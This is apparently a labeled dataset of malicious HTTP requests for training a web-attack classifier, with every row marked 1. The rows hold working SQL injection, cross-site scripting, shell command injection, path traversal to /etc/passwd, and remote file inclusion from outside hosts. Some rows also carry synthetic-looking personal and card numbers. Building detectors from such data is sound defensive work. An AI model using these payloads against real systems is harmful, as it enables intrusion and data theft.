sentences 	 labels
/ string & strings & parameters = 1 '  rlike  ( select  ( case when  ( 6855 = 1056 )  then 1 else 0x28 end )  )  and  ' pmrz '  like  ' pmrz  	 1
/ string & strings & parameters = 1 "  "  )  )  )  ; select  ( case when  ( 8993 = 8846 )  then 8993 else 8993 *  ( select 8993 from mysql . db )  end )  #  	 1
/ string & strings & parameters = 1 %  '  )  )  or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  )  and  (  (  '  %  '  =  '  	 1
/ cacti & faxsurvey ? cat  / etc / passwd  	 1
/ string & strings & parameters = ( select  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3287 = 3287 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo bjmmjx )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 1
/ moodle & filter & tex & texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + d7 + 93 + ff + d7 + 95 + 83 + c4 + 10 + 58 + 5a + 59 + 53 + 55 + 50 + 8b + ec + 50 + 57 + 52 + 56 + 6a + 06 + 5a + eb + 0e +  +  >  > esbq  	 1
/ scs86g1p . cfm ?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >  	 1
/ string & modo = registro & login = cicchino & password = red , uctora & nombre = regino & apellidos = cortadel + montori & email = litja @ decoaching . cy & dni = 40735914q & direccion = plza .  + pescador ,  + 173 ,  +  & ciudad = espejo & cp = 15531 & provincia = crdoba & ntc = 9365944348061840 & b1 = registrar  	 1
/ r3le3om5 . htm ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ en-us & account & core & api . php ? t_path_core =  / etc / passwd \ x00  	 1
/ examples & jsp & cal & k & home ? dir =  /  & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd & lang = kor  	 1
/ string & strings & parameters = "  & echo $ ifsounxwg $  (  ( 62 + 52 )  )  $  ( echo $ ifsounxwg ) ounxwg \  	 1
/ ap58k3ci . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ include & theme . inc . php ? fullpath =  / etc / passwd \ x00  	 1
/ top . php ? stuff =  " sleep \ x099 \ x09 #? stuff =  " sleep \ x099 \ x09 #  	 1
/ string & strings & parameters = "   str =  $  ( echo locfpz )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  &  	 1
/ string & strings & parameters = -4044 %  "  "  or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  "  "  %  "  "  =  "  "  	 1
/ odzk29aa . php ?  < script > document . cookie =  " testtfvh = 2141 ;  "  <  ?  < script > document . cookie =  " testtfvh = 2141 ;  "  <  / script >  	 1
/ scripts & event_view . php ? eid = 34 union select 1215611548  	 1
/ templates & default & tpl_message . php ? right_file = xxpathxx  	 1
/ string & strings & parameters = < a "  '   `  =   +   >  ; test < a "  '   `  =   +   >  ? test < a "  '   `  =   +   >  ;  # test < a "  '   `  =   +   >  ;  	 1
/ top . php ? stuff =  "  ; del \ x09q82281214 \ x09 #? stuff =  "  ; del \ x09q82281214 \ x09 #  	 1
/ iktok2bw . php3 ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = 1 "  "  )  or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  and  (  "  " dwpa "  "  =  "  " dwpa  	 1
/ string & strings & parameters = '   str =  $  ( echo lmrvvk )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 1
/ string & strings & parameters = < svg & onload = eval ( atob ( location . hash . slice ( 1 )  )  )  >  # ywxlcnqomskvlw =  =  	 1
/ string & strings & parameters = 1 %  '  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  '  %  '  =  '  	 1
/ string & modo = registro & login = willison & password = a2ent9dora & nombre = adelen & apellidos = avell & email = slaughter-worde @ juegois . ac & dni = 93046182g & direccion = senda + fanaler * o ,  +  +  * 198 + 1-b & ciudad = figueruelas & cp = 01220 & provincia = burgos & ntc = 6349941758199278 & b1 = registrar  	 1
/ string & modo = insertar & precio = 1380 & b1 = any ?  set-cookie :  + tamper = 5765205567234876235  	 1
/ string & strings & parameters = 1 )  where 7425 = 7425 union all select null , null , null , null , null , null , null , null , null , null --  	 1
/ scripts & faq . php ? action =  & type = view & s =  & id = -1 '  union select 0 , 1539349120 , 0 , 0 , 0 , 0 , 0 --  	 1
/ main . php ? stuff =  "  \ x0dsleep \ x099 \ x09 #? stuff =  "  \ x0dsleep \ x099 \ x09 #  	 1
/ examples & jsp & jsp2 & jspx & lib & dbman_filter . inc . php ? lib_path =  / etc / passwd \ x00  	 1
/ string & strings & parameters = <  !  --  < img src =  "  --  >  < img src = x onerror = alert ( 1 )  &  &  "  >  	 1
/ examples & jsp & jsp2 & jspx & forumdisplay . php ? fid = 21 "  >  < script > x <  / script >  	 1
/ manager & themes & program & themesettings . inc . php ? themesdir =  / etc / passwd \ x00  	 1
/ string & strings & parameters = |   [  2 -ne  $  ( echo teuisw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 1
/ a0imiuf1 . dll ?  < script > document . cookie =  " testxqrn = 4654 ;  "  <  ?  < script > document . cookie =  " testxqrn = 4654 ;  "  <  / script >  	 1
/ string & strings & parameters = 1  union  select  abc  from  abc  	 1
/ string & modo = entrar & login = arro & pwd = carminar <  !  --  # include + file =  " archivo_secreto "  +  --  >  & remember = on & b1 = entrar  	 1
/  ?  < meta http-equiv = set-cookie content =  " testziyq = 5055 "  >?  < meta http-equiv = set-cookie content =  " testziyq = 5055 "  >  	 1
/ bin & fileseek . cgi ? foot =  & head =  ; cat  / etc / passwd |  	 1
/ string & strings & parameters = 1 '  )  )  )  ; select sleep ( 5 )  #  	 1
/ cgi-bin & tst . bat | dir  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  ,  	 1
/ string & strings & parameters = -2298 %  '  or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  #  	 1
/ j4drbkil . asp ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = -5116 )  or  ( 8287 = 4930 )  * 4930  	 1
/ examples & jsp & colors & index . php ? p =  ' nessus  	 1
/ string & strings & parameters = "  &  sleep 0  &  &  str =  $  ( echo jtlwwu )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  	 1
/ review . php ? id = 1 & cat =  & subcat =  "  >  < script > alert (  ' phpmydirectory_multiple_xss . nasl '  )  ;  <  ? id = 1 & cat =  & subcat =  "  >  < script > alert (  ' phpmydirectory_multiple_xss . nasl '  )  ;  <  / script >  	 1
/ examples & servlets & servletmultihtml . pl ? multi =  / etc / passwd \ x00html  	 1
/ cacti & sgdynamo . exe ? htname =  < script > foo <  / script >  	 1
/ forum . asp ? n =  .  .  ? n =  .  .  /  .  .  / boot . ini | 41 | 80040e14 |  [ microsoft ]  [ odbc_sql_server_driver ]  [ sql_server ] line_1 : _incorrect_syntax_near_ &  # 039 ;  /  &  # 039 ;  .  	 1
/ string & strings & parameters = 1 "  "  )  )  and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  "  " duuw "  "  =  "  " duuw  	 1
/ examples & servlets & servlet & story . pl ? next =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = 1 )  )  as pjkd where 1105 = 1105 and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  --  	 1
/ examples & jsp & num & php . cgi ?  / etc / passwd  	 1
/ scripts & index . php ? op = default & date = 200607 '  union select 1 , 372196707 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1  	 1
/ string & strings & parameters = 1 '  and 6055 = ctxsys . drithsx . sn ( 6055 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  ' cgbf '  like  ' cgbf  	 1
/ string & strings & parameters = '  echo $ ifsmnpqov $  (  ( 53 + 67 )  )  $  ( echo $ ifsmnpqov ) mnpqov \  	 1
/ string & strings & parameters = &  # 0062  	 1
/ help . php ? q =  "  ; uname \ x09 > q51344488 \ x09 #? q =  "  ; uname \ x09 > q51344488 \ x09 #  	 1
/ string & strings & parameters = 1 "  "  )  )  )  ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  	 1
/ string & strings & parameters = 1 "  "  )  )  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  (  (  "  " ilge "  "  like  "  " ilge  	 1
/ string & strings & parameters = < svg xmlns =  " http :  &  & www . w3 . org & 2000 & svg "  >  < a xmlns : xlink =  " http :  &  & www . w3 . org & 1999 & xlink "  xlink : href =  " javascript : alert ( 1 )  "  >  < rect width =  " 1000 "  height =  " 1000 "  fill =  " white "  &  >  <  & a >  <  & svg >  	 1
/ main . php ? stuff =  " del \ x0bq67582951 & rem \ x0b? stuff =  " del \ x0bq67582951 & rem \ x0b  	 1
/ string & str =  $  ( echo fnslec )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 1
/ examples & jsp & jsp2 & jspx & anacondaclip . pl ? template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ comments . php ? scriptpath = http :  ? scriptpath = http :  /  / 192 . 168 . 202 . 96 : 8080 / frznctvhi0i5 ?  ?  	 1
/ main . php ? logout = ping ; -w ; 10000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;? logout = ping ; -w ; 10000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ;  	 1
/ string & strings & parameters = 1 ,  ' 0 '  )  ; waitfor delay  ' 0 : 0 : 50 ;  --  	 1
/ administrator & components & com_feederator & includes & tmsp & subscription . php ? globals [ mosconfig_absolute_path ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 1
/ ao22ww7y . cgi ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  / script >  	 1
/ awstats & awstats . pl ? migrate =  | echo ;  /  .  / tmp / wgwvwkorhp . sh ; echo | awstats540737 . txt  	 1
/ b5xdqgz2 . cfm ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ top . php ? stuff =  "  & ver \ x0b > q54461117 & rem \ x0b? stuff =  "  & ver \ x0b > q54461117 & rem \ x0b  	 1
/ 3j8echh0 . php3 ?  < meta http-equiv = set-cookie content =  " testfuqi = 4189 "  >?  < meta http-equiv = set-cookie content =  " testfuqi = 4189 "  >  	 1
/ vjbrrppi . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo dkkeqz )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 1
/ javascript & recorder . exe  	 1
/ cgi-bin & visadmin . exe  	 1
/ string & strings & parameters = echo injqrh $  (  ( 6 + 71 )  )  $  ( echo injqrh ) injqrh '  	 1
/ string & strings & parameters = "  ;  str =  $  ( echo baksin )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 1
/ string & strings & parameters = "  &  & echo $ ifswpyoyt $  (  ( 86 + 46 )  )  $  ( echo $ ifswpyoyt ) wpyoyt &  &  	 1
/ cacti & sawmill6cl . exe ? ho +  { complete_version }  	 1
/ string & strings & parameters = < script a =  `  >  `  src =  "  " http :  &  & vulnerability-lab . com & crosssitescripting . js "  "  >  <  & script >  	 1
/ nmw0do67 . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = ? x =  	 1
/ en-us & account & man-cgi ? section = 0 & topic = ls ; id  	 1
/ cacti & supporter & tupdate . php ? groupid = change & sg =  '  	 1
/ string & strings & parameters = 1 %  "  "  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  "  "  %  "  "  =  "  "  	 1
/ templates & tmpl_dfl & scripts & index . php ? dir [ inc ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  	 1
/ string & strings & parameters = 1 '  where 1045 = 1045 or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  --  	 1
/ string & strings & parameters = 1 %  '  )  order by 1 --  	 1
/ scripts & event_view . php ? eid = 34 union select 294969347  	 1
/ examples & jsp & colors & inc & functions . inc . php ? config [ ppa_root_path ]  =  / etc / passwd \ x00  	 1
/ site &  '  union all select filetoclob (  '  & etc & passwd '  ,  ' server '  )  :  : html , 0 from sysusers where username  =  user  --  &  . html  	 1
/ string & modo = registro & login = percy & password =  '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & nombre = pars & apellidos = corral + rahal & email = healy @ ajedrezconmaestros . ch & dni = 15756299b & direccion = carrer + verge + de + l ' alba ,  + s & n +  & ciudad = san + morales & cp = 15338 & provincia = len & ntc = 8682803216185712 & b1 = registrar  	 1
/ bl8sefdm . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = 1 "  "  where 1852 = 1852 union all select null , null , null , null , null , null , null , null , null #  	 1
/ string & strings & parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null , null )   #  	 1
/ string & strings & parameters = \ nnetstat -a %  \ n  	 1
/ default . asp ? catid = 1234567890 '? catid = 1234567890 '  	 1
/ ender ' s_game &  	 1
/ string & strings & parameters = < layer src =  "  " javascript : document . cookie = true ;  "  "  >  <  & layer >  	 1
/ cgi-bin & phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904181 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  	 1
/ javascript & aliases . exe  	 1
/ string & strings & parameters = 1 "  "  )  where 1107 = 1107 and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 1
/ i7prbs22 . aspx ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  / script >  	 1
/ index . php ? config [  " sipssys "  ]  = http :  ? config [  " sipssys "  ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 1
/ cgi-bin & dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = "  |  | echo $ ifsrjobxi $  (  ( 9 + 83 )  )  $  ( echo $ ifsrjobxi ) rjobxi '  	 1
/ quagynka . pl ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ cgi-binsearch_results . dot ? search_query = nessus "  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  ? search_query = nessus "  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  / script >  /  	 1
/ string & strings & parameters = echo $ ifslixpwr $  (  ( 69 + 26 )  )  $  ( echo $ ifslixpwr ) lixpwr '  	 1
/ fa8p8lr8 . aspx ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = "  , null , null , null , null , null , null , null , null )  waitfor delay  ' 0 : 0 : 20 '   --  	 1
/ string & strings & parameters = 1 "  "  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  "  " cxsu "  "  like  "  " cxsu  	 1
/ phpmyadmin &  &  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows & win . ini  	 1
/ ustorekeeper . pl ? command = goto & file =  .  .  ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ fnwhrxyd . php ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = 1 '  and 7533 = 7533 and  ' clqy '  like  ' clqy  	 1
/ examples & servlets & servlet & texis . exe &  ? -dump  	 1
/ uvazfs7p . asp ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  	 1
/ index . php ? open = xxpathxx? open = xxpathxx  	 1
/ string & strings & parameters = 1 '  where 1093 = 1093 union all select null , null , null , null , null , null , null --  	 1
/ string & strings & parameters = 1 )  and 9660 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  	 1
/ script & common . inc . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  	 1
/ bzuf9ozq . do ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = &  & echo $ ifsonqkzz $  (  ( 73 + 7 )  )  $  ( echo $ ifsonqkzz ) onqkzz "  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo logujr )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  &  &  	 1
/ javascript & next . exe  	 1
/ cgi-bin & store . cgi ? startid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html  	 1
/ top . php ? stuff =  '  & rm q28696513  #? stuff =  '  & rm q28696513  #  	 1
/ string & strings & parameters = '  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  &  &  \  '  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  &  &  "  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  &  &  \  "  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  &  &  >  <  & script >  !  --  < script > alert ( string . fromcharcode ( 88 , 83 , 83 )  )  <  & script >  =  &  {  }  	 1
/ string & modo = registro & login = mcdavitt & password = brigosa & nombre = agapio '  + and +  ' 1 '  =  ' 1 & apellidos = san + emeterio + farzati & email = roeves @ esbien . kg & dni = 26396263z & direccion = calle + louis + pasteur + 148 ,  + 2 ? g & ciudad = bercimuel & cp = 10129 & provincia = barcelona & ntc = 1686893417722016 & b1 = registrar  	 1
/ ao22ww7y . do ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  ?  < script > document . cookie =  " testqppc = 8767 ;  "  <  / script >  	 1
/ string & strings & parameters = 1 '  )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  (  ' ggiw '  =  ' ggiw  	 1
/ main . php ? stuff =  " uname  > q22289594  #? stuff =  " uname  > q22289594  #  	 1
/ en-us & hipkz026 . idc ?  < meta http-equiv = set-cookie content =  " testyrbs = 2855 "  >  	 1
/ string & modo = insertar ?  & precio = 8384 & b1 = confirmar  	 1
/ string & modo = registro & login = levasseu & password = embarbillado & nombre = zuleika & apellidos = peazco + arreche & email = others @ tetdevelocidad . sz & dni = 91212440y & direccion = c &  + mostoles + 25 ,  + 2c & ciudad = amposta & cp = 1812a & provincia = valencia & ntc = 1675356603176027 & b1 = registrar  	 1
/ string & strings & parameters = < meta http-equiv = set-cookie content =  " testwldz = 3506 "  >  	 1
/ string & strings & parameters = 1 '  where 1917 = 1917 or 6979 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 & 2 )  )  )  )  --  	 1
/ m5103snj . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & modo = paros "  + style =  " background : url ( javascript : alert (  ' paros '  )  )  & id = 2 & precio = 587 & b1 = pasar + por + caja  	 1
/ main . php ? stuff =  " ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0? stuff =  " ping \ xa0-w \ xa09000 \ xa0-n \ xa01 \ xa04 . 3 . 2 . 1 & rem \ xa0  	 1
/ help . php ? q =  "  & rm q31935143 & rem? q =  "  & rm q31935143 & rem  	 1
/ string & strings & parameters = &  & echo $ ifswokocd $  (  ( 20 + 68 )  )  $  ( echo $ ifswokocd ) wokocd '  	 1
/ main . php ? logout =  & ver ,  > q24489971 & rem ,? logout =  & ver ,  > q24489971 & rem ,  	 1
/ string & modo = entrar & login = juni & pwd =  +  & remember = on & b1 = entrar  	 1
/ string & str =  $  ( echo ivbazq )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 1
/ exophpdesk_path & pipe . php ? lang_file = xxpathxx  	 1
/ string & strings & parameters = |   [  9 -ne  $  ( echo hzzokr  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ help . php ? q =  ' del \ x09q97653798 \ x09 #? q =  ' del \ x09q97653798 \ x09 #  	 1
/ string & modo = registro & login = mckillop & password = margraviato & nombre = leonor & apellidos = pantiga + corredor & email = miranoa @ enla . web & dni = 36674466t & direccion = mencia + calderon ,  + 170 ,  + 13b & ciudad = manzanares + de + rioja & cp = 05427 & provincia = vizcaya '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & ntc = 7784731967679465 & b1 = registrar  	 1
/ d7ktpmcq . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ en-us & 9kr0ih0v . php3 ?  < meta http-equiv = set-cookie content =  " testzgnm = 1183 "  >  	 1
/ string & strings & parameters = "  &  sleep 0  &  &  str =  $  ( echo ezdzjg )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  #  	 1
/ string & strings & parameters = 1 %  '  and make_set ( 8403 = 8403 , 8899 )  and  '  %  '  =  '  	 1
/ examples & jsp & jsp2 & jspx & alienform . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  	 1
/ hipkz026 . exe ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  / script >  	 1
/ javascript & wp . exe  	 1
/ help . php ? q =  "  ; uname \ x09 > q21654461 \ x09 #? q =  "  ; uname \ x09 > q21654461 \ x09 #  	 1
/ string & modo = registro & login = saladna & passworda = na6u40476a8in & nombre = amranto & apellidos = enjuanes + corbi & email = tin @ velazquezlarraaga . aw & dni = 09894897k & direccion = c &  + 358 + 180 + 13 ? g & ciudad = sanlcar + de + barrameda & cp = 16118 & provincia = cuenca & ntc = 1923588691952780 & b1 = registrar  	 1
/ top . php ? stuff =  " ver \ x09 > q19467518 & rem \ x09? stuff =  " ver \ x09 > q19467518 & rem \ x09  	 1
/ string & strings & parameters = < script src = http :  &  & ha . ckers . org & xss . js ?  <  b  >  	 1
/ string & strings & parameters = < a onmouseover = location = ’javascript : alert ( 1 )  > click  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo qeluff )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  &  &  	 1
/ help . php ? q =  "  & rm q44114596  #? q =  "  & rm q44114596  #  	 1
/ string & modo = entrar & login = schlacht & pwd = 43s8a & remember = off &  & b1 = entrar  	 1
/ demo & ms-pe02 & catalog . php ? cid = 0 & sid =  '  "  & sortfield = title & sortorder = asc & pagenumber = 1 & main = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ?  &  	 1
/ string & strings & parameters = " xss ' cx <  & img  	 1
/ string & strings & parameters = 1 %  '  ; select  ( case when  ( 3677 = 2193 )  then 3677 else 1 &  ( select 0 )  end )  --  	 1
/ exchange &  .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  \ xc1 \ xc1 .  .  & winnt & system32 & cmd . exe ?  / c + dir + c :  \  +  / og  	 1
/ string & strings & parameters = 1 %  '  )  )  union all select null , null , null , null , null , null , null , null , null , null --  	 1
/ egaet53a . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ en-us &  < script > cross_site_scripting . nasl <  & script >  . fts  	 1
/ string & modo = entrar & login = weatherl4 & pwd = vinazo & remember = on & b1 =  |  	 1
/ bmeun223 . jspa ?  < script > document . cookie =  " testhhwu = 7044 ;  "  <  ?  < script > document . cookie =  " testhhwu = 7044 ;  "  <  / script >  	 1
/ string & strings & parameters = a )  | id ;  	 1
